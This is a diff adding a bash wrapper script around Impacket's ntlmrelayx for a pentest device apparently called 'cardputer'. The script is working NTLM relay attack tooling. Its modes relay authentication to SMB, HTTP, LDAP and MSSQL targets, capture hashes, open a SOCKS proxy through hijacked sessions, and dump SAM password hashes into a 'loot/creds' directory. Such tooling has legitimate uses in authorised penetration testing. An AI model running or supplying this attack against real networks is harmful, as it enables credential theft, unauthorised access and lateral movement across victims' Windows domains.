@@ -1,0 +1,172 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/ntlmrelayx
+# NTLM authentication relay attack wrapper for Impacket's ntlmrelayx
+# Usage: ntlmrelayx <mode> [options]
+# Modes: relay, listener, multi, socks, dump, help
+
+LOOT="/opt/cardputer/loot/creds"
+CONF_DIR="/opt/cardputer/config/ntlmrelayx"
+mkdir -p "$LOOT" "$CONF_DIR"
+
+check_impacket() {
+    if ! command -v ntlmrelayx.py &>/dev/null; then
+        echo "[!] Impacket not found. Install with:"
+        echo "    pip3 install impacket"
+        echo "    apt install impacket-scripts"
+        exit 1
+    fi
+}
+
+case "${1:-help}" in
+    relay|--relay|-r)
+        check_impacket
+        TARGET="${2:-}"
+        IFACE="${3:-eth0}"
+        LPORT="${4:-80}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: ntlmrelayx relay <target_ip> [iface] [listen_port]"
+            echo ""
+            echo "Relay NTLM auth to target system."
+            echo ""
+            echo "Example: ntlmrelayx relay 192.168.1.100 eth0 80"
+            exit 1
+        fi
+
+        echo "[*] NTLM Relay Attack"
+        echo "[*] Target: $TARGET"
+        echo "[*] Interface: $IFACE"
+        echo "[*] Listen port: $LPORT"
+        echo ""
+
+        LOCAL_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
+        echo "[*] Local IP: $LOCAL_IP"
+        echo "[+] Starting ntlmrelayx..."
+        echo ""
+
+        ntlmrelayx.py -t "smb://${TARGET}" -l "$LOOT" -smb2support -wh "${LOCAL_IP}" 2>&1 | tee "$LOOT/ntlmrelay_$(date +%Y%m%d_%H%M%S).log"
+        ;;
+
+    listener|--listener|-l)
+        check_impacket
+        LPORT="${2:-80}"
+
+        echo "[*] NTLM Relay Listener Mode"
+        echo "[*] Capturing NTLM hashes without relay"
+        echo "[*] Listen port: $LPORT"
+        echo ""
+
+        ntlmrelayx.py -t "" -l "$LOOT" -smb2support 2>&1 | tee "$LOOT/ntlmrelay_listen_$(date +%Y%m%d_%H%M%S).log"
+        ;;
+
+    multi|--multi|-m)
+        check_impacket
+        TARGETS_FILE="${2:-}"
+        IFACE="${3:-eth0}"
+
+        if [ -z "$TARGETS_FILE" ] || [ ! -f "$TARGETS_FILE" ]; then
+            echo "Usage: ntlmrelayx multi <targets_file> [iface]"
+            echo ""
+            echo "Relay to multiple targets from file (one per line)."
+            echo "Target formats: smb://ip, http://ip, ldap://ip, mssql://ip"
+            echo ""
+            echo "Example: ntlmrelayx multi targets.txt eth0"
+            exit 1
+        fi
+
+        # Build target list
+        TARGETS=""
+        while IFS= read -r line; do
+            line=$(echo "$line" | tr -d '[:space:]')
+            [ -z "$line" ] && continue
+            [[ "$line" == \#* ]] && continue
+            if echo "$line" | grep -q '://'; then
+                TARGETS="${TARGETS},${line}"
+            else
+                TARGETS="${TARGETS},smb://${line}"
+            fi
+        done < "$TARGETS_FILE"
+        TARGETS="${TARGETS#,}"
+
+        if [ -z "$TARGETS" ]; then
+            echo "[!] No valid targets found in $TARGETS_FILE"
+            exit 1
+        fi
+
+        LOCAL_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
+        echo "[*] NTLM Multi-Relay Attack"
+        echo "[*] Targets: $TARGETS"
+        echo "[*] Interface: $IFACE"
+        echo ""
+
+        ntlmrelayx.py -t "$TARGETS" -l "$LOOT" -smb2support -wh "${LOCAL_IP}" 2>&1 | tee "$LOOT/ntlmrelay_multi_$(date +%Y%m%d_%H%M%S).log"
+        ;;
+
+    socks|--socks|-S)
+        check_impacket
+        IFACE="${2:-eth0}"
+        SOCKS_PORT="${3:-1080}"
+
+        echo "[*] NTLM Relay SOCKS Proxy Mode"
+        echo "[*] Interface: $IFACE"
+        echo "[*] SOCKS port: $SOCKS_PORT"
+        echo ""
+        echo "[+] After relay, use proxychains with:"
+        echo "    socks5 127.0.0.1 $SOCKS_PORT"
+        echo ""
+
+        ntlmrelayx.py -t "" -l "$LOOT" -smb2support -socks -socksport "$SOCKS_PORT" 2>&1 | tee "$LOOT/ntlmrelay_socks_$(date +%Y%m%d_%H%M%S).log"
+        ;;
+
+    dump|--dump|-d)
+        check_impacket
+        TARGET="${2:-}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: ntlmrelayx dump <target_ip>"
+            echo ""
+            echo "Dump SAM hashes from relayed target."
+            echo ""
+            echo "Example: ntlmrelayx dump 192.168.1.100"
+            exit 1
+        fi
+
+        echo "[*] NTLM Relay + SAM Dump"
+        echo "[*] Target: $TARGET"
+        echo ""
+
+        ntlmrelayx.py -t "smb://${TARGET}" -l "$LOOT" -smb2support --dump-hashes 2>&1 | tee "$LOOT/ntlmrelay_dump_$(date +%Y%m%d_%H%M%S).log"
+        ;;
+
+    help|--help|-h)
+        echo "Usage: ntlmrelayx <mode> [options]"
+        echo ""
+        echo "NTLM Authentication Relay Attack (Impacket wrapper)"
+        echo ""
+        echo "Modes:"
+        echo "  relay <target> [iface] [port]   Relay NTLM auth to target"
+        echo "  listener [port]                  Capture NTLM hashes"
+        echo "  multi <targets_file> [iface]     Relay to multiple targets"
+        echo "  socks [iface] [socks_port]       SOCKS proxy via relayed sessions"
+        echo "  dump <target>                    Relay + dump SAM hashes"
+        echo ""
+        echo "Target URL formats: smb://ip, http://ip, ldap://ip, mssql://ip"
+        echo ""
+        echo "Examples:"
+        echo "  ntlmrelayx relay 192.168.1.100"
+        echo "  ntlmrelayx listener"
+        echo "  ntlmrelayx multi targets.txt"
+        echo "  ntlmrelayx socks eth0 1080"
+        echo "  ntlmrelayx dump 192.168.1.100"
+        echo ""
+        echo "Requirement: impacket (pip3 install impacket)"
+        exit 0
+        ;;
+
+    *)
+        echo "[!] Unknown mode: $1"
+        echo "Run: ntlmrelayx help"
+        exit 1
+        ;;
+esac
